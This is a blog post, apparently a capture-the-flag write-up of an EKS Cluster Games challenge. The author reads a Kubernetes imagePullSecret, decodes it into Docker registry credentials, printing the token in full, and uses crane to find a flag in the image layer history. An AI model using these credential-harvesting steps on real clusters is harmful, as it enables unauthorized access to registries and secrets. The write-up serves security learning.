@@ -1,0 +1,161 @@
+<!doctype html><html dir=ltr lang=en data-theme class="html theme--light"><head><title>Tobias Brixen
+|
+EKS Cluster Games: Challenge 2</title><meta charset=utf-8><meta name=generator content="Hugo 0.110.0"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=author content="Tobias Brixen"><meta name=description content><link rel=stylesheet href=/scss/main.min.1147aa5bacb4bce677a0e264073829caedb82fd18ea07a5f1d80521f539d1c45.css integrity="sha256-EUeqW6y0vOZ3oOJkBzgpyu24L9GOoHpfHYBSH1OdHEU=" crossorigin=anonymous type=text/css><link rel=stylesheet href=/css/markupHighlight.min.73ccfdf28df555e11009c13c20ced067af3cb021504cba43644c705930428b00.css integrity="sha256-c8z98o31VeEQCcE8IM7QZ688sCFQTLpDZExwWTBCiwA=" crossorigin=anonymous type=text/css><link rel=stylesheet href=/fontawesome/css/fontawesome.min.7d272de35b410fb165377550cdf9c4d3a80fbbcc961e111914e4d5c0eaf5729f.css integrity="sha256-fSct41tBD7FlN3VQzfnE06gPu8yWHhEZFOTVwOr1cp8=" crossorigin=anonymous type=text/css><link rel=stylesheet href=/fontawesome/css/solid.min.55d8333481b07a08e07cf6f37319753a2b47e99f4c395394c5747b48b495aa9b.css integrity="sha256-VdgzNIGwegjgfPbzcxl1OitH6Z9MOVOUxXR7SLSVqps=" crossorigin=anonymous type=text/css><link rel=stylesheet href=/fontawesome/css/regular.min.a7448d02590b43449364b6b5922ed9af5410abb4de4238412a830316dedb850b.css integrity="sha256-p0SNAlkLQ0STZLa1ki7Zr1QQq7TeQjhBKoMDFt7bhQs=" crossorigin=anonymous type=text/css><link rel=stylesheet href=/fontawesome/css/brands.min.9ed75a5d670c953fe4df935937674b4646f92674367e9e66eb995bb04e821647.css integrity="sha256-ntdaXWcMlT/k35NZN2dLRkb5JnQ2fp5m65lbsE6CFkc=" crossorigin=anonymous type=text/css><link rel="shortcut icon" href=/favicon.ico type=image/x-icon><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=canonical href=https://tbrixen.github.io/post/eks-cluster-games-challenge-2/><script type=text/javascript src=/js/anatole-header.min.f9132794301a01ff16550ed66763482bd848f62243d278f5e550229a158bfd32.js integrity="sha256-+RMnlDAaAf8WVQ7WZ2NIK9hI9iJD0nj15VAimhWL/TI=" crossorigin=anonymous></script>
+<script type=text/javascript src=/js/anatole-theme-switcher.min.d6d329d93844b162e8bed1e915619625ca91687952177552b9b3e211014a2957.js integrity="sha256-1tMp2ThEsWLovtHpFWGWJcqRaHlSF3VSubPiEQFKKVc=" crossorigin=anonymous></script>
+<script async defer src=https://analytics.umami.is/script.js data-website-id=b1c6be44-f1ef-4886-862e-f468d2b074be></script><meta name=twitter:card content="summary"><meta name=twitter:title content="EKS Cluster Games: Challenge 2"><meta name=twitter:description content="This is my writeup of how I solved the second challenge of the EKS Cluster Games."><meta property="og:title" content="EKS Cluster Games: Challenge 2"><meta property="og:description" content="This is my writeup of how I solved the second challenge of the EKS Cluster Games."><meta property="og:type" content="article"><meta property="og:url" content="https://tbrixen.github.io/post/eks-cluster-games-challenge-2/"><meta property="article:section" content="post"><meta property="article:published_time" content="2023-12-05T11:28:47+02:00"><meta property="article:modified_time" content="2023-12-05T11:28:47+02:00"><meta property="og:site_name" content="tbrixen"><meta property="og:see_also" content="https://tbrixen.github.io/post/eks-cluster-games-challenge-1/"><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","articleSection":"post","name":"EKS Cluster Games: Challenge 2","headline":"EKS Cluster Games: Challenge 2","alternativeHeadline":"","description":"
+      
+        This is my writeup of how I solved the second challenge of the EKS Cluster Games.
+
+
+      
+
+
+    ","inLanguage":"en-us","isFamilyFriendly":"true","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/tbrixen.github.io\/post\/eks-cluster-games-challenge-2\/"},"author":{"@type":"Person","name":"Tobias Brixen"},"creator":{"@type":"Person","name":"Tobias Brixen"},"accountablePerson":{"@type":"Person","name":"Tobias Brixen"},"copyrightHolder":{"@type":"Person","name":"Tobias Brixen"},"copyrightYear":"2023","dateCreated":"2023-12-05T11:28:47.00Z","datePublished":"2023-12-05T11:28:47.00Z","dateModified":"2023-12-05T11:28:47.00Z","publisher":{"@type":"Organization","name":"Tobias Brixen","url":"https://tbrixen.github.io/","logo":{"@type":"ImageObject","url":"https:\/\/tbrixen.github.io\/favicon-32x32.png","width":"32","height":"32"}},"image":[],"url":"https:\/\/tbrixen.github.io\/post\/eks-cluster-games-challenge-2\/","wordCount":"651","genre":[],"keywords":[]}</script></head><body class=body><div class=wrapper><aside class=wrapper__sidebar><div class="sidebar
+animated fadeInDown"><div class=sidebar__content><div class=sidebar__introduction><img class=sidebar__introduction-profileimage src=/images/profile.png alt="profile picture"><div class=sidebar__introduction-title><a href=/>tbrixen</a></div><div class=sidebar__introduction-description><p></p></div></div><ul class=sidebar__list><li class=sidebar__list-item><a href=http://github.com/tbrixen target=_blank rel="noopener me" aria-label=Github title=Github><i class="fab fa-github fa-2x" aria-hidden=true></i></a></li><li class=sidebar__list-item><a href=https://dk.linkedin.com/in/tbrixen target=_blank rel="noopener me" aria-label=Linkedin title=Linkedin><i class="fab fa-linkedin fa-2x" aria-hidden=true></i></a></li></ul></div><footer class="footer footer__sidebar"><ul class=footer__list><li class=footer__item>&copy;
+Tobias Brixen
+2023</li></ul></footer><script type=text/javascript src=/js/medium-zoom.min.1248fa75275e5ef0cbef27e8c1e27dc507c445ae3a2c7d2ed0be0809555dac64.js integrity="sha256-Ekj6dSdeXvDL7yfoweJ9xQfERa46LH0u0L4ICVVdrGQ=" crossorigin=anonymous></script></div></aside><main class=wrapper__main><header class=header><div class="animated fadeInDown"><a role=button class=navbar-burger data-target=navMenu aria-label=menu aria-expanded=false><span aria-hidden=true class=navbar-burger__line></span>
+<span aria-hidden=true class=navbar-burger__line></span>
+<span aria-hidden=true class=navbar-burger__line></span></a><nav class=nav><ul class=nav__list id=navMenu></ul><ul class="nav__list nav__list--end"><li class=nav__list-item><div class=themeswitch><a title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></li></ul></nav></div></header><div class="post
+animated fadeInDown"><div class=post__content><h1>EKS Cluster Games: Challenge 2</h1><ul class=post__meta><li class=post__meta-item><em class="fas fa-calendar-day post__meta-icon"></em>
+<span class=post__meta-text>Tue, Dec 5, 2023</span></li><li class=post__meta-item><em class="fas fa-stopwatch post__meta-icon"></em>
+<span class=post__meta-text>4-minute read</span></li></ul><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#challenge-2---registry-hunt>Challenge 2 - Registry Hunt</a><ul><li><a href=#recon-pods-and-secrets>Recon: Pods and secrets</a></li><li><a href=#looking-into-the-secrets>Looking into the secrets</a></li><li><a href=#getting-stuck>Getting stuck</a></li><li><a href=#peeling-off-the-layers>Peeling off the layers</a></li><li><a href=#could-it-have-been-simpler>Could it have been simpler?</a></li></ul></li></ul></nav><p>This is my writeup of how I solved the second challenge of the <a href=https://eksclustergames.com/>EKS Cluster Games</a>.</p><h2 id=challenge-2---registry-hunt>Challenge 2 - Registry Hunt</h2><p>The challenge hints that we should check the container registries. They also link to a rather long post (18 minute read) on <a href=https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql>Hells KeyChain</a>. It seemed long, so I skipped it initially.</p><blockquote><p>A thing we learned during our research: always check the container registries.</p></blockquote><h3 id=recon-pods-and-secrets>Recon: Pods and secrets</h3><p>We are told we have the following permissions</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;secrets&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;get&#34;</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;pods&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;list&#34;</span><span class=p>,</span> <span class=s2>&#34;get&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>So, we can&rsquo;t list secrets, but let&rsquo;s see which pods are running</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ kubectl get pods
+</span></span><span class=line><span class=cl>NAME                    READY   STATUS    RESTARTS   AGE
+</span></span><span class=line><span class=cl>database-pod-2c9b3a4e   1/1     Running   <span class=m>0</span>          30h
+</span></span></code></pre></div><p>Just a single pod. Does it have anything interesting?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>$</span> <span class=nx>k</span> <span class=nx>get</span> <span class=nx>pod</span> <span class=nx>database</span><span class=o>-</span><span class=nx>pod</span><span class=o>-</span><span class=mi>2</span><span class=nx>c9b3a4e</span> <span class=o>-</span><span class=nx>o</span> <span class=nx>json</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;apiVersion&#34;</span><span class=o>:</span> <span class=s2>&#34;v1&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;kind&#34;</span><span class=o>:</span> <span class=s2>&#34;Pod&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;metadata&#34;</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;annotations&#34;</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;kubernetes.io/psp&#34;</span><span class=o>:</span> <span class=s2>&#34;eks.privileged&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=p>[...]</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span>
+</span></span><span class=line><span class=cl>        <span class=p>[...]</span>
+</span></span><span class=line><span class=cl>    <span class=p>},</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;spec&#34;</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;containers&#34;</span><span class=o>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;image&#34;</span><span class=o>:</span> <span class=s2>&#34;eksclustergames/base_ext_image&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;imagePullPolicy&#34;</span><span class=o>:</span> <span class=s2>&#34;Always&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=p>[...]</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;volumeMounts&#34;</span><span class=o>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>                    <span class=p>{</span>
+</span></span><span class=line><span class=cl>                        <span class=s2>&#34;mountPath&#34;</span><span class=o>:</span> <span class=s2>&#34;/var/run/secrets/kubernetes.io/serviceaccount&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                        <span class=s2>&#34;name&#34;</span><span class=o>:</span> <span class=s2>&#34;kube-api-access-cq4m2&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                        <span class=s2>&#34;readOnly&#34;</span><span class=o>:</span> <span class=kc>true</span>
+</span></span><span class=line><span class=cl>                    <span class=p>}</span>
+</span></span><span class=line><span class=cl>                <span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>],</span>
+</span></span><span class=line><span class=cl>        <span class=p>[...]</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;imagePullSecrets&#34;</span><span class=o>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=o>:</span> <span class=s2>&#34;registry-pull-secrets-780bab1d&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>],</span>
+</span></span><span class=line><span class=cl>        <span class=p>[...]</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;volumes&#34;</span><span class=o>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=o>:</span> <span class=s2>&#34;kube-api-access-cq4m2&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=p>[...]</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=p>},</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;status&#34;</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=p>[...]</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;containerStatuses&#34;</span><span class=o>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;containerID&#34;</span><span class=o>:</span> <span class=s2>&#34;containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;image&#34;</span><span class=o>:</span> <span class=s2>&#34;docker.io/eksclustergames/base_ext_image:latest&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;imageID&#34;</span><span class=o>:</span> <span class=s2>&#34;docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=p>[...]</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>],</span>
+</span></span><span class=line><span class=cl>        <span class=p>[...]</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>I noted a couple of things</p><ul><li>Is it running <code>eks.privileged</code></li><li>It always pulls the image</li><li>It has an <code>imagePullSecret</code> named <code>registry-pull-secrets-780bab1d</code></li><li>It has a volume mounted called <code>kube-api-access-cq4m2</code></li></ul><h3 id=looking-into-the-secrets>Looking into the secrets</h3><p>Can we get the <code>kube-api-access-cq4m2</code> secret? No, it seems not (it later hit me that it was a volume, not a secret)</p><pre tabindex=0><code>$ k get secret kube-api-access-cq4m2
+Error from server (NotFound): secrets &#34;kube-api-access-cq4m2&#34; not found
+</code></pre><p>What about the <code>imagePullSecret</code>?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ k get secret registry-pull-secrets-780bab1d -o json
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;apiVersion&#34;</span>: <span class=s2>&#34;v1&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;data&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;.dockerconfigjson&#34;</span>: <span class=s2>&#34;eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;kind&#34;</span>: <span class=s2>&#34;Secret&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;metadata&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;annotations&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;pulumi.com/autonamed&#34;</span>: <span class=s2>&#34;true&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;creationTimestamp&#34;</span>: <span class=s2>&#34;2023-11-01T13:31:29Z&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;registry-pull-secrets-780bab1d&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;namespace&#34;</span>: <span class=s2>&#34;challenge2&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;resourceVersion&#34;</span>: <span class=s2>&#34;897340&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;uid&#34;</span>: <span class=s2>&#34;1348531e-57ff-42df-b074-d9ecd566e18b&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;type&#34;</span>: <span class=s2>&#34;kubernetes.io/dockerconfigjson&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><p>Success, it had a <code>.dockerconfigjson</code>! This seemed to be credentials for the registry at <code>index.docker.io/v1/</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s2>&#34;eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19&#34;</span> <span class=p>|</span> base64 -d
+</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;auths&#34;</span>: <span class=o>{</span><span class=s2>&#34;index.docker.io/v1/&#34;</span>: <span class=o>{</span><span class=s2>&#34;auth&#34;</span>: <span class=s2>&#34;ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==&#34;</span><span class=o>}}}</span>
+</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw</span><span class=o>==</span> <span class=p>|</span> base64 -d
+</span></span><span class=line><span class=cl>eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo%
+</span></span></code></pre></div><p>This might be 1 of the secrets which the Hells KeyChain refers to: the private container registry password.</p><h3 id=getting-stuck>Getting stuck</h3><p>What next? After hitting a dead end with the <code>kube-api-access-cq4m2</code> I started reading the post on Hells KeyChain.
+I found they&rsquo;ve found an <code>imagePullSecret</code> in the same manner as I.</p><p>They also taled about secrets being leaked in Docker layers. Let us look into that.</p><h3 id=peeling-off-the-layers>Peeling off the layers</h3><p>The challenge page mentioned a utility called <code>crane</code> was installed. So I started toying with it.</p><p>I found I could log in to the container registry using <code>crane auth login docker.io -u eksclustergames -p thepasswordfromabove</code>, and I was able to interact with the registry</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ crane ls eksclustergames/base_ext_image
+</span></span><span class=line><span class=cl>latest
+</span></span></code></pre></div><p>I tried listing other images, but there were none. I then searched for a way to get info on the layers, and found that <code>crane config</code> would provide me the history of an image</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>crane config eksclustergames/base_ext_image
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;architecture&#34;</span>: <span class=s2>&#34;amd64&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;config&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;Env&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>]</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;Cmd&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;/bin/sleep&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;3133337&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>]</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;ArgsEscaped&#34;</span>: true,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;OnBuild&#34;</span>: null
+</span></span><span class=line><span class=cl>    <span class=o>}</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;created&#34;</span>: <span class=s2>&#34;2023-11-01T13:32:18.920734382Z&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;history&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;created&#34;</span>: <span class=s2>&#34;2023-07-18T23:19:33.538571854Z&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;created_by&#34;</span>: <span class=s2>&#34;/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / &#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;created&#34;</span>: <span class=s2>&#34;2023-07-18T23:19:33.655005962Z&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;created_by&#34;</span>: <span class=s2>&#34;/bin/sh -c #(nop)  CMD [\&#34;sh\&#34;]&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;empty_layer&#34;</span>: <span class=nb>true</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;created&#34;</span>: <span class=s2>&#34;2023-11-01T13:32:18.920734382Z&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;created_by&#34;</span>: <span class=s2>&#34;RUN sh -c echo &#39;wiz_eks_challenge{REDACTED}&#39; &gt; /flag.txt # buildkit&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;comment&#34;</span>: <span class=s2>&#34;buildkit.dockerfile.v0&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;created&#34;</span>: <span class=s2>&#34;2023-11-01T13:32:18.920734382Z&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;created_by&#34;</span>: <span class=s2>&#34;CMD [\&#34;/bin/sleep\&#34; \&#34;3133337\&#34;]&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;comment&#34;</span>: <span class=s2>&#34;buildkit.dockerfile.v0&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;empty_layer&#34;</span>: <span class=nb>true</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=o>]</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;os&#34;</span>: <span class=s2>&#34;linux&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;rootfs&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;type&#34;</span>: <span class=s2>&#34;layers&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;diff_ids&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>]</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><p>and there is was, the command that created the layer containing the flag: <code>wiz_eks_challenge{REDACTED}</code> 🚀</p><h3 id=could-it-have-been-simpler>Could it have been simpler?</h3><p>Would we have been able to do this without the imagePullSecret? No, it seems not</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ crane auth <span class=nb>logout</span> docker.io
+</span></span><span class=line><span class=cl>2023/11/02 21:05:35 logged out via /home/user/.docker/config.json
+</span></span><span class=line><span class=cl>$ crane config eksclustergames/base_ext_image
+</span></span><span class=line><span class=cl>Error: fetching config: reading image <span class=s2>&#34;eksclustergames/base_ext_image&#34;</span>: GET https://index.docker.io/v2/eksclustergames/base_ext_image/manifests/latest: UNAUTHORIZED: authentication required<span class=p>;</span> <span class=o>[</span>map<span class=o>[</span>Action:pull Class: Name:eksclustergames/base_ext_image Type:repository<span class=o>]]</span>
+</span></span></code></pre></div><h3>Posts in this series</h3><ul><li><a href=/post/eks-cluster-games-challenge-2/>EKS Cluster Games: Challenge 2</a></li><li><a href=/post/eks-cluster-games-challenge-1/>EKS Cluster Games: Challenge 1</a></li></ul></div><div class=post__footer></div><div id=comment><h2>comments</h2><script>const getStoredTheme=()=>localStorage.getItem("theme")==="dark"?"dark":"light",setGiscusTheme=()=>{const e=e=>{const t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:e},"https://giscus.app")};e({setConfig:{theme:getStoredTheme()}})};document.addEventListener("DOMContentLoaded",()=>{const n={src:"https://giscus.app/client.js","data-repo":"tbrixen/tbrixen.github.io","data-repo-id":"MDEwOlJlcG9zaXRvcnkxODQ4NDI1MQ==","data-category":"Announcements","data-category-id":"DIC_kwDOARoMG84CXzE9","data-mapping":"pathname","data-strict":"0","data-reactions-enabled":"1","data-emit-metadata":"0","data-input-position":"bottom","data-theme":getStoredTheme(),"data-lang":"en","data-loading":"lazy",crossorigin:"anonymous",async:""},e=document.createElement("script");Object.entries(n).forEach(([t,n])=>e.setAttribute(t,n)),document.getElementById("comment").appendChild(e);const t=document.querySelector(".themeswitch");t&&t.addEventListener("click",setGiscusTheme)})</script></div></div></main></div><footer class="footer footer__base"><ul class=footer__list><li class=footer__item>&copy;
+Tobias Brixen
+2023</li></ul></footer><script type=text/javascript src=/js/medium-zoom.min.1248fa75275e5ef0cbef27e8c1e27dc507c445ae3a2c7d2ed0be0809555dac64.js integrity="sha256-Ekj6dSdeXvDL7yfoweJ9xQfERa46LH0u0L4ICVVdrGQ=" crossorigin=anonymous></script></body></html>
